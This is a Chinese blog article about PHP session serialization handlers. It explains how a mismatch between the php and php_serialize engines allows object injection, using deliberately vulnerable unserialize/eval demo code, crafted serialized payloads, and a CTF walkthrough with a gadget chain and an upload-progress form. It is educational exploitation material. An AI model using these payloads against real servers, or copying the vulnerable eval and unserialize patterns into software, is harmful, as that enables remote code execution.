# PHP 中 SESSION 反序列化机制 - 文章 - 伯乐在线
原文出处： [乘物游心](http://blog.spoock.com/2016/10/16/php-serialize-problem/)
### 简介
在php.ini中存在三项配置项：

PHP
```
session.save_path=""   --设置session的存储路径
session.save_handler="" --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)
session.auto_start   boolen --指定会话模块是否在请求开始时启动一个会话,默认为0不启动
session.serialize_handler   string --定义用来序列化/反序列化的处理器名字。默认使用php
```
以上的选项就是与PHP中的Session存储和序列话存储有关的选项。
在使用xampp组件安装中，上述的配置项的设置如下：


```
session.save_path="D:\xampp\tmp"	表明所有的session文件都是存储在xampp/tmp下
session.save_handler=files		  	表明session是以文件的方式来进行存储的
session.auto_start=0				表明默认不启动session
session.serialize_handler=php	   	表明session的默认序列话引擎使用的是php序列话引擎
```
在上述的配置中，`session.serialize_handler`是用来设置session的序列话引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。
- php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值
- php:存储方式是，键名+竖线+经过serialize()函数序列处理的值
- php_serialize(php>5.5.4):存储方式是，经过serialize()函数序列化处理的值
在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码`ini_set('session.serialize_handler', '需要设置的引擎');`。示例代码如下：


```
<?php
ini_set('session.serialize_handler', 'php_serialize');
session_start();
// do something
```
### 存储机制
php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项`session.save_handler`来进行确定的，默认是以文件的方式存储。
存储的文件是以`sess_sessionid`来进行命名的，文件的内容就是session值的序列话之后的内容。
假设我们的环境是xampp，那么默认配置如上所述。
在默认配置情况下：


```
<?php
session_start()
$_SESSION['name'] = 'spoock';
var_dump();
?>
```
最后的session的存储和显示如下：
![](http://7xrnu9.com1.z0.glb.clouddn.com/php-sesssion/1.png)
可以看到PHPSESSID的值是`jo86ud4jfvu81mbg28sl2s56c2`，而在`xampp/tmp`下存储的文件名是`sess_jo86ud4jfvu81mbg28sl2s56c2`，文件的内容是`name|s:6:"spoock";`。name是键值，`s:6:"spoock";`是`serialize("spoock")`的结果。
在php_serialize引擎下：


```
<?php
ini_set('session.serialize_handler', 'php_serialize');
session_start();
$_SESSION['name'] = 'spoock';
var_dump();
?>
```
SESSION文件的内容是`a:1:{s:4:"name";s:6:"spoock";}`。`a:1`是使用php_serialize进行序列话都会加上。同时使用php_serialize会将session中的key和value都会进行序列化。
在php_binary引擎下：


```
<?php
ini_set('session.serialize_handler', 'php_binary');
session_start();
$_SESSION['name'] = 'spoock';
var_dump();
?>
```
SESSION文件的内容是`names:6:"spoock";`。由于`name`的长度是4，4在ASCII表中对应的就是`EOT`。根据php_binary的存储规则，最后就是`names:6:"spoock";`。(突然发现ASCII的值为4的字符无法在网页上面显示，这个大家自行去查ASCII表吧)
### 序列化简单利用
test.php


```
<?php
class syclover{
        var $func="";
        function __construct() {
            $this->func = "phpinfo()";
        }
        function __wakeup(){
            eval($this->func);
        }
}
unserialize($_GET['a']);
?>
```
在11行对传入的参数进行了序列化。我们可以通过传入一个特定的字符串，反序列化为syclover的一个示例，那么就可以执行eval()方法。我们访问`localhost/test.php?a=O:8:"syclover":1:{s:4:"func";s:14:"echo "spoock";";}`。那么反序列化得到的内容是:


```
object(syclover)[1]
  public 'func' => string 'echo "spoock";' (length=14)
```
最后页面输出的就是spoock，说明最后执行了我们定义的`echo "spoock";`方法。
这就是一个简单的序列化的漏洞的演示
### PHP Session中的序列化危害
PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。
如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。例如:


```
$_SESSION['ryat'] = '|O:11:"PeopleClass":0:{}';
```
上述的$_SESSION的数据使用`php_serialize`，那么最后的存储的内容就是`a:1:{s:6:"spoock";s:24:"|O:11:"PeopleClass":0:{}";}`。
但是我们在进行读取的时候，选择的是`php`，那么最后读取的内容是:


```
array (size=1)
  'a:1:{s:6:"spoock";s:24:"' => 
    object(__PHP_Incomplete_Class)[1]
      public '__PHP_Incomplete_Class_Name' => string 'PeopleClass' (length=11)
```
这是因为当使用php引擎的时候，php引擎会以**|**作为作为key和value的分隔符，那么就会将`a:1:{s:6:"spoock";s:24:"`作为SESSION的key，将`O:11:"PeopleClass":0:{}`作为value，然后进行反序列化，最后就会得到PeopleClas这个类。
这种由于序列话化和反序列化所使用的不一样的引擎就是造成PHP Session序列话漏洞的原因。
### 实际利用
存在s1.php和us2.php，2个文件所使用的SESSION的引擎不一样，就形成了一个漏洞、
s1.php，使用php_serialize来处理session


```
<?php
ini_set('session.serialize_handler', 'php_serialize');
session_start();
$_SESSION["spoock"]=$_GET["a"];
```
us2.php,使用php来处理session


```
ini_set('session.serialize_handler', 'php');
session_start();
class lemon {
    var $hi;
    function __construct(){
        $this->hi = 'phpinfo();';
    }
    
    function __destruct() {
         eval($this->hi);
    }
}
```
当访问s1.php时，提交如下的数据：


```
localhost/s1.php?a=|O:5:"lemon":1:{s:2:"hi";s:14:"echo "spoock";";}
```
此时传入的数据会按照**php_serialize**来进行序列化。
此时访问us2.php时，页面输出，`spoock`成功执行了我们构造的函数。因为在访问us2.php时，程序会按照**php**来反序列化SESSION中的数据，此时就会反序列化伪造的数据，就会实例化lemon对象，最后就会执行析构函数中的eval()方法。
### CTF
在安恒杯中的一道题目就考察了这个知识点。题目中的关键代码如下：
class.php


```
<?php
highlight_string(file_get_contents(basename($_SERVER['PHP_SELF'])));
//show_source(__FILE__);
class foo1{
        public $varr;
        function __construct(){
                $this->varr = "index.php";
        }
        function __destruct(){
                if(file_exists($this->varr)){
                        echo "<br>文件".$this->varr."存在<br>";
                }
                echo "<br>这是foo1的析构函数<br>";
        }
}
class foo2{
        public $varr;
        public $obj;
        function __construct(){
                $this->varr = '1234567890';
                $this->obj = null;
        }
        function __toString(){
                $this->obj->execute();
                return $this->varr;
        }
        function __desctuct(){
                echo "<br>这是foo2的析构函数<br>";
        }
}
class foo3{
        public $varr;
        function execute(){
                eval($this->varr);
        }
        function __desctuct(){
                echo "<br>这是foo3的析构函数<br>";
        }
}
?>
```
index.php


```
<?php
ini_set('session.serialize_handler', 'php');
require("./class.php");
session_start();
$obj = new foo1();
$obj->varr = "phpinfo.php";
?>
```
通过代码发现，我们最终是要通过foo3中的execute来执行我们自定义的函数。
那么我们首先在本地搭建环境，构造我们需要执行的自定义的函数。如下：
myindex.php


```
<?php
class foo3{
        public $varr='echo "spoock";';
        function execute(){
                eval($this->varr);
        }
}
class foo2{
        public $varr;
        public $obj;
        function __construct(){
                $this->varr = '1234567890';
                $this->obj = new foo3();
        }
        function __toString(){
                $this->obj->execute();
                return $this->varr;
        }
}
class foo1{
        public $varr;
        function __construct(){
                $this->varr = new foo2();
        }
}
$obj = new foo1();
print_r(serialize($obj));
?>
```
在foo1中的构造函数中定义$varr的值为foo2的实例，在foo2中定义$obj为foo3的实例，在foo3中定义$varr的值为`echo "spoock"`。最终得到的序列话的值是


```
O:4:"foo1":1:{s:4:"varr";O:4:"foo2":2:{s:4:"varr";s:10:"1234567890";s:3:"obj";O:4:"foo3":1:{s:4:"varr";s:14:"echo "spoock";";}}}
```
这样当上面的序列话的值写入到服务器端，然后再访问服务器的index.php，最终就会执行我们预先定义的`echo "spoock";`的方法了。
写入的方式主要是利用PHP中[Session Upload Progress](http://php.net/manual/en/session.upload-progress.php)来进行设置，具体为，在上传文件时，如果POST一个名为PHP_SESSION_UPLOAD_PROGRESS的变量，就可以将filename的值赋值到session中，上传的页面的写法如下：


```
<form action="index.php" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
    <input type="file" name="file" />
    <input type="submit" />
</form>
```
最后就会将文件名写入到session中，具体的实现细节可以参考PHP手册。
那么最终写入的文件名是`|O:4:"foo1":1:{s:4:"varr";O:4:"foo2":2:{s:4:"varr";s:1:"1";s:3:"obj";O:4:"foo3":1:{s:4:"varr";s:12:"var_dump(1);";}}}`。注意与本地反序列化不一样的地方是要在最前方加上**|**
但是我在进行本地测试的时候，发现无法实现安恒这道题目所实现的效果，但是最终的原理是一样的。
### 总结
通过对PHP中的SESSION的分析，对PHP中的SESSION的实现原理有了更加深刻的认识。这个PHP的SESSION问题也是一个很好的问题。上述的这篇文章不仅使大家PHP中的SESSION的序列化漏洞有一个认识，也有助于程序员加强在PHP中的SESSION机制的理解。
### 参考
PHP Session 序列化及反序列化处理器：[http://drops.wooyun.org/tips/3909](http://drops.wooyun.org/tips/3909)
PHP序列化与反序列化解读：[http://www.freebuf.com/articles/web/90837.html](http://www.freebuf.com/articles/web/90837.html)
php序列化：[http://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html](http://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html)
Joomla远程代码执行漏洞分析（总结）：[https://www.leavesongs.com/?keyword=Joomla](https://www.leavesongs.com/?keyword=Joomla)
web3 session反序列化：[http://www.math1as.com/index.php/archives/227/](http://www.math1as.com/index.php/archives/227/)
